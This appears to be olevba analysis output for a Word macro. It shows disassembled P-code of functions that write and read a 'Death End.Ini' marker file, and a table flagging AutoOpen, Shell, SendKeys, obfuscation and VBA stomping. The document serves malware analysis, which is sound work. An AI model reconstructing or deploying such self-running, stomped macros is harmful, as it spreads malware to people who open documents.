' 	NextVar 
' Line #161:
' 	Ld flg 
' 	St Ismail 
' Line #162:
' 	EndFunc 
' Line #163:
' Line #164:
' 	FuncDefn (Function Stopmail() As String)
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	Ld pq 
' 	LitStr 0x000E "\Death End.Ini"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "Yes"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #169:
' 	OnError (GoTo 0) 
' Line #170:
' 	EndFunc 
' Line #171:
' Line #172:
' 	FuncDefn (Function Endmail())
' Line #173:
' Line #174:
' 	Dim 
' 	VarDefn ret
' Line #175:
' 	LitStr 0x0002 "No"
' 	St ret 
' Line #176:
' 	OnError (Resume Next) 
' Line #177:
' 	Ld pq 
' 	LitStr 0x000E "\Death End.Ini"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #178:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld ret 
' 	InputItem 
' 	InputDone 
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #180:
' 	OnError (GoTo 0) 
' Line #181:
' 	Ld ret 
' 	St Endmail 
' Line #182:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|IOC       |calc.exe            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

